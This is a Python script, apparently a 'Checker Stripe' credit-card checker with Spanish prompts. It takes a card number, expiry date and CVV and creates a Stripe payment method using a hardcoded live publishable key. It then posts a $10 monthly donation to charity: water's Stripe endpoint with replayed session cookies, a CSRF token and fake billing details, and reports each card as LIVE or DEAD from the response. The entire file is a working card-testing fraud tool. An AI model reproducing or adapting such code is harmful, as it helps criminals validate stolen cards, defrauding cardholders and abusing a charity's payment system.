import requests
from colorama import init,Fore
init()

banner =Fore.MAGENTA+ """"

.d8888. d888888b d8888b. d888888b d8888b. d88888b         A          db  .d88b.      .d88b.  
88'  YP `~~88~~' 88  `8D   `88'   88  `8D 88'          .d8888.      o88 .8P  88.    .8P  88. 
`8bo.      88    88oobY'    88    88oodD' 88ooooo      88'8 YP       88 88  d'88    88  d'88 
  `Y8b.    88    88`8b      88    88~~~   88~~~~~      `8b8.         88 88 d' 88    88 d' 88 
db   8D    88    88 `88.   .88.   88      88.            `V8b.       88 `88  d8' db `88  d8' 
`8888Y'    YP    88   YD Y888888P 88      Y88888P      db 8 8D       VP  `Y88P'  VP  `Y88P'  
                                                       `8888Y'                               
                                                          V                               
Checker Stripe 
"""
print(banner)


cc = int(input('Ingrese la cc: '))
mes = int(input('ingrese el mes: ') )
ano = int(input('Ingrese el año: '))
cvv = int(input('Ingrese el cvv: '))



headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'es-ES,es;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
}

data = f'type=card&billing_details[address][postal_code]=10010&billing_details[address][city]=ny&billing_details[address][country]=US&billing_details[address][line1]=strett+456&billing_details[email]=ewfwwfwfwef%40gmail.com&billing_details[name]=dhjjhwegewhj+edewfwrfe&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=1ae2c337-d23e-4968-ba44-cf67f6c46ba8a11185&muid=378f9b34-2db6-4a34-abf8-44e51da597edfc2ba0&sid=fbcd4dec-ed92-4c12-8ae5-65e6537c3600810c12&payment_user_agent=stripe.js%2F4a30826976%3B+stripe-js-v3%2F4a30826976&time_on_page=1166374&key=pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU'

response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

if "error" in response.text:
    print('CC DEAD')
else:
    idw = response.json()['id']
    cookies = {
        'countrypreference': 'US',
        'optimizelyEndUserId': 'oeu1684799388004r0.7486010193547585',
        'ajs_anonymous_id': 'c01d0f31-5eb8-46f6-b2e0-28e87dff858d',
        '_gid': 'GA1.2.180805600.1684799394',
        '_gcl_au': '1.1.1343909270.1684799395',
        '__attentive_id': 'ba8310fc0c984f769d64aa808086bb80',
        '_attn_': 'eyJ1Ijoie1wiY29cIjoxNjg0Nzk5Mzk5NzYxLFwidW9cIjoxNjg0Nzk5Mzk5NzYxLFwibWFcIjoyMTkwMCxcImluXCI6ZmFsc2UsXCJ2YWxcIjpcImJhODMxMGZjMGM5ODRmNzY5ZDY0YWE4MDgwODZiYjgwXCJ9In0=',
        '__attentive_cco': '1684799399765',
        '_tt_enable_cookie': '1',
        '_ttp': 'UmTvZNmZYdWpqY8kMlNJ1pR-7wO',
        '_fbp': 'fb.1.1684799400934.624998638',
        '__attentive_dv': '1',
        '__stripe_mid': '378f9b34-2db6-4a34-abf8-44e51da597edfc2ba0',
        'builderSessionId': '1e750d4398854b91a28e26c5671d93f4',
        'analytics_session_id': '1684816304943',
        '__attentive_ss_referrer': 'https://www.charitywater.org/donate-au',
        '__stripe_sid': 'fbcd4dec-ed92-4c12-8ae5-65e6537c3600810c12',
        'IR_gbd': 'charitywater.org',
        'IR_16318': '1684816805083%7C0%7C1684816805083%7C%7C',
        '_ga': 'GA1.1.2126305704.1684799394',
        '__attentive_pv': '2',
        '_ga_SKG6MDYX1T': 'GS1.1.1684816306.3.1.1684817848.0.0.0',
        '_uetsid': '5c624920f8fb11edb7763f0c3251766f',
        '_uetvid': '5c626d80f8fb11ed823d31fa1a042022',
        '_ga_VXC7NJM2RF': 'GS1.1.1684817869.3.0.1684817869.60.0.0',
        'attntv_mstore_email': 'ewfwwfwfwef@gmail.com:0',
        '_gat': '1',
        'analytics_session_id.last_access': '1684817971192',
    }

    headers = {
        'authority': 'www.charitywater.org',
        'accept': '*/*',
        'accept-language': 'es-ES,es;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    
        'origin': 'https://www.charitywater.org',
        'referer': 'https://www.charitywater.org/',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'x-csrf-token': 'D4IhVkXOrFNEbJ_-kyTFacKbLbSxqKsI182tuDlQi_-NtMkxJjT8P8Yi-mLsUODoXJiE2oxECqI2HwY_DDC31Q',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'country': 'us',
        'payment_intent[email]': 'ewfwwfwfwef@gmail.com',
        'payment_intent[amount]': '10',
        'payment_intent[currency]': 'usd',
        'payment_intent[metadata][analytics_id]': 'c01d0f31-5eb8-46f6-b2e0-28e87dff858d',
        'payment_intent[payment_method]': idw,
        'payment_intent[setup_future_usage]': 'off_session',
        'disable_existing_subscription_check': 'false',
        'donation_form[amount]': '10',
        'donation_form[anonymous]': 'true',
        'donation_form[comment]': '',
        'donation_form[display_name]': '',
        'donation_form[email]': 'ewfwwfwfwef@gmail.com',
        'donation_form[name]': 'dhjjhwegewhj',
        'donation_form[payment_gateway_token]': '',
        'donation_form[payment_monthly_subscription]': 'true',
        'donation_form[surname]': 'edewfwrfe',
        'donation_form[campaign_id]': 'a5826748-d59d-4f86-a042-1e4c030720d5',
        'donation_form[analytics_uuid]': 'c01d0f31-5eb8-46f6-b2e0-28e87dff858d',
        'donation_form[setup_intent_id]': '',
        'donation_form[subscription_period]': 'monthly',
        'donation_form[profile_campaign_id]': '',
        'donation_form[metadata][address][address_line_1]': 'strett 456',
        'donation_form[metadata][address][address_line_2]': '',
        'donation_form[metadata][address][city]': 'ny',
        'donation_form[metadata][address][country]': '',
        'donation_form[metadata][address][zip]': '10010',
        'donation_form[metadata][experiments][experiment_22901813287][experiment_id]': '22901813287',
        'donation_form[metadata][experiments][experiment_22901813287][experiment_name]': 'Jan 2023 - Homepage Top Bar Spring Page Promo Test',
        'donation_form[metadata][experiments][experiment_22901813287][variant_name]': 'Variation #1',
        'donation_form[metadata][experiments][experiment_22723142537][experiment_id]': '22723142537',
        'donation_form[metadata][experiments][experiment_22723142537][experiment_name]': 'Gift language patch until eng implements',
        'donation_form[metadata][experiments][experiment_22723142537][variant_name]': 'Original',
        'donation_form[metadata][experiments][experiment_24095050526][experiment_id]': '24095050526',
        'donation_form[metadata][experiments][experiment_24095050526][experiment_name]': 'Will adding an ‘impact’ section below the /donate form help increase conversion?',
        'donation_form[metadata][experiments][experiment_24095050526][variant_name]': 'Variation #1 - 100% Model Text',
        'donation_form[metadata][full_donate_page_url]': 'https://www.charitywater.org/',
        'donation_form[metadata][phone_number]': '',
        'donation_form[metadata][phone_number_consent_granted]': '',
        'donation_form[metadata][plaid_account_id]': '',
        'donation_form[metadata][plaid_public_token]': '',
        'donation_form[metadata][referer]': 'https://www.charitywater.org/donate-au',
        'donation_form[metadata][url_params][touch_type]': '1',
        'donation_form[metadata][with_saved_payment]': 'false',
        'subscription[amount]': '10',
        'subscription[country]': 'us',
        'subscription[email]': 'ewfwwfwfwef@gmail.com',
        'subscription[full_name]': 'dhjjhwegewhj edewfwrfe',
        'subscription[is_annual]': 'false',
    }

    response1 = requests.post('https://www.charitywater.org/donate/stripe', cookies=cookies, headers=headers, data=data)

    if "Your card has insufficient funds." in response1.text:
        print(Fore.GREEN+f"""CC LIVE FUND

CC : {cc}
año : {ano}
Mes {mes}
Cvv  : {cvv}

response : Your card has insufficient funds.""")
    
    elif "Your card's security code or expiration date is incorrect." in response1.text:
        print(Fore.GREEN+f"""CC LIVE CCN

CC : {cc}
año : {ano}
Mes {mes}
Cvv  : {cvv}

response : Your card's security code or expiration date is incorrect.""")
    elif "success" in response1.text:
        print(Fore.GREEN+f"""CC LIVE 

CC : {cc}
año : {ano}
Mes {mes}
Cvv  : {cvv}

response : APROVADA""")
    elif "Your card's security code is invalid." in response1.text:
        print(Fore.GREEN+f"""CC LIVE CVV/CCN

CC : {cc}
año : {ano}
Mes {mes}
Cvv  : {cvv}

response : Your card's security code is invalid.""")
    elif"Your card was declined." in response1.text:
        print(Fore.RED+f"""CC DEAD

CC : {cc}
año : {ano}
Mes {mes}
Cvv  : {cvv}

response : Your card was declined.""")
    else:
        ee = response1.json()['error']['message']
        
        print(Fore.RED+f"""CC DEAD

CC : {cc}
año : {ano}
Mes {mes}
Cvv  : {cvv}

response : {ee}""")
        